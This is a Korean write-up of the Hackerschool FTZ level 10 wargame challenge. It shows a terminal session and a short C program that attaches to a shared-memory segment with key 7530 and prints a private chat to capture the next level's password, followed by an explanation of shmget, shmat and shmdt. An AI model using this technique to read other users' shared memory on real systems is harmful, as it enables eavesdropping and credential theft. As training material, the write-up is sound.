# Hackerschool FTZ Level 10

```
ogin as: level10
level10@192.168.18.131's password:
[level10@ftz level10]$ ls
hint  program  public_html  tmp
[level10@ftz level10]$ cat hint


두명의 사용자가 대화방을 이용하여 비밀스런 대화를 나누고 있다.
그 대화방은 공유 메모리를 이용하여 만들어졌으며,
key_t의 값은 7530이다. 이를 이용해 두 사람의 대화를 도청하여
level11의 권한을 얻어라.

- 레벨을 완료하셨다면 소스는 지우고 나가주세요.


[level10@ftz level10]$ cd tmp
[level10@ftz tmp]$ vi start.c
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <sys/types.h>

int main(void){
        int shmid = shmget(7530, 1024, IPC_EXCL|0660);
        char* shm = shmat(shmid, NULL, 0);
        printf("%s\n", shm);
        shmdt(shm);
        return 0;
}
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
"start.c" 13L, 244C                                           1,1           All
```

```
[level10@ftz tmp]$ gcc -o start start.c
[level10@ftz tmp]$ ./start
멍멍: level11의 패스워드는?
구타: what!@#$?

[level10@ftz tmp]$
```

공유메모리의 사용을 묻는 문제이다. 힌트를 보면

```
두명의 사용자가 대화방을 이용하여 비밀스런 대화를 나누고 있다.
그 대화방은 공유 메모리를 이용하여 만들어졌으며,
key_t의 값은 7530이다. 이를 이용해 두 사람의 대화를 도청하여
level11의 권한을 얻어라.
```

라고 한다. `start.c` 파일에 코딩을 하여 이 공유 메모리를 읽어왔다.

`shmget` 함수는 `key_t` 값을 이용하여 공유메모리의 ID를 새로 만들거나 얻는 함수이다.

`shmid` 에 공유메모리의 id를 담았으니 다음은 그 주소를 얻기 위하여 `shmat` 함수를 사용한다.

마지막으로 `shmdt` 함수를 사용하여 현제 프로세스에서 공유 메모리 사용을 해제해준다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <sys/types.h>

int main(void){
        int shmid = shmget(7530, 1024, IPC_EXCL|0660);
        char* shm = shmat(shmid, NULL, 0);
        printf("%s\n", shm);
        shmdt(shm);
        return 0;
}
```